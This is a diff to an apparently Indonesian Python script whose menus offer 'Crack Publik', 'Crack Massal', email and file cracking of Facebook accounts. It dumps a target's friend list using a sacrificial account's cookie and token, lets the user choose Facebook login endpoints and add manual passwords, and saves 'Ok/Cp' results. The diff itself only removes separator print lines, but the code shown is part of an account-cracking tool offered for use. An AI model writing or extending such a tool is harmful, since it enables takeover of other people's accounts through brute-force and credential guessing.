@@ -211,9 +211,8 @@ def banner():
 \t\t    {u}author by {K}RulRecoder\n''')
 def awal():
 	banner()
-	prints(panel(f"""{P}[{c}01{P}]{P} Login With Lisensi{P}\n{P}[{c}02{P}] {P}Hubungi Admin{P}\n{P}[{M}00{P}] {P}Exit Licensi{P} """,width=43,title=f"[[green] LOG IN [/]]",style=f"bold blue"))
+	prints(panel(f"""{P}[{c}01{P}] Login With Lisensi\n{P}[{c}02{P}] Hubungi Admin\n{P}[{M}00{P}] Exit Licensi """,width=43,title=f"[[green] LOG IN [/]]",style=f"bold blue"))
 	cukuf = input(f"{biru}└──[{puti}{ung} Input{puti} : {H}")
-	print(f"{biru}─────────────────────────────────────────────{puti}")
 	if cukuf in ["1","01"]:
 		run()
 	elif cukuf in ["2","02"]:
@@ -397,13 +396,11 @@ def menu():
 	prints(panel(f"""[white][[cyan]•[white]] Name Tumbal [[green]{nama}[white]]\n[[cyan]•[white]] Idz Tumbal [white][[green]{uidfb}[white]]\n[white][[cyan]•[white]] Your Ip [[green]{alamat_ip}[white]]""",width=43,title=f"[[green] INFO [/]]",style=f"bold blue"))
 	prints(panel(f"""[white][[cyan]01[white]] Crack Publik [[green]ON[white]] \n[[cyan]02[white]] Crack Massal [white][[red]OF[white]] \n[[cyan]03[white]] Crack Email [white][[green]ON[white]] \n[[cyan]04[white]] Crack File [white][[green]ON[white]] \n[[cyan]05[white]] Result Ok/Cp [[green]ON[white]]\n[[red]00[white]] logout [white][[red]hapus cookies[white]] [[green]ON[white]] """,width=43,title=f"[[green] MENU CRACK [/]]",style=f"bold blue"))
 	CYXIEON_GANTENG = input(f'{biru}└──[{puti}{ung} Input {puti}:{hijo} ')
-	print(f"{biru}─────────────────────────────────────────────{puti}")
 	if CYXIEON_GANTENG in ['01','1']:
 	    print(f"\n{biru}╭────────────────────────────────────────────{puti}")
 	    print(f"└──[ Ketik me untuk dump pertemanan dari akun tumbal")
 	    idt = input('└──[ ID Target : ')
 	    dump(idt,"",{"cookie":cok},token)
-	    print(f"{biru}─────────────────────────────────────────────{puti}")
 	    atur_id()
 	if CYXIEON_GANTENG in ['02','2']:
 	   massal()
@@ -467,7 +464,6 @@ def massal():
 	      exit()
 	try:
 	      prints(f"└──[ lagi mengumpulkan id, telah sukses mengumpulkan [green]{len(id)}[white] id")
-	      print(f"{biru}─────────────────────────────────────────────{puti}")
 	      atur_id()
 	except requests.exceptions.ConnectionError:
 	    exit()
@@ -502,7 +498,6 @@ def mail2():
 		else:id.append(DD+'|'+nama)
 		if len(dump)==999999:passwordlist()
 		sys.stdout.write(f"\r└──[ berhasil mengumpulkan {b}{len(id)} {P}email...");sys.stdout.flush()
-		print(f"{biru}─────────────────────────────────────────────{puti}")
 		time.sleep(0.0000003)
 	print("\r")
 	atur_id()
@@ -519,7 +514,6 @@ def Crack_file():
 			sys.stdout.flush()
 			id.append(data)
 	except FileNotFoundError:exit(f"└──[ file tidak ada")
-	print(f"{biru}─────────────────────────────────────────────{puti}")
 	atur_id()
 #----------[ CRACK-PUBLIK  ]----------#            
 def dump(idt,fields,cookie,token):
@@ -666,7 +660,6 @@ def atur_method():
 	print(f'{biru}└──[{puti} {c}02.{puti} m.facebook.com ({mer}Reguler{puti}) ')
 	print(f'{biru}└──[{puti} {c}03.{puti} mbasic.facebook.com ({kun}Asyinc{puti}) ')      
 	CYXIEON_METHODE = input(f'{biru}└──[{puti}{ung} Input{puti} :{hijo} ')
-	print(f"{biru}─────────────────────────────────────────────{puti}")
 	if CYXIEON_METHODE in ['1','01']:
 	   method.append('validate')  
 	elif CYXIEON_METHODE in ['2','02']:
@@ -678,7 +671,6 @@ def atur_method():
 	print(f"\n{biru}╭────────────────────────────────────────────{puti}")
 	print(f'{biru}└──[{puti} Tambahkan pw manual (y/t) ')
 	passwtamb = input(f'{biru}└──[{puti}{ung} Input {puti}:{hijo} ')
-	print(f"{biru}─────────────────────────────────────────────{puti}")
 	if passwtamb in ['y','Y']:
 		     sandine.append('ya')
 		     sandiku = input(f'{biru}└──[{puti}{ung} Input Pw{puti} :{hijo} ')
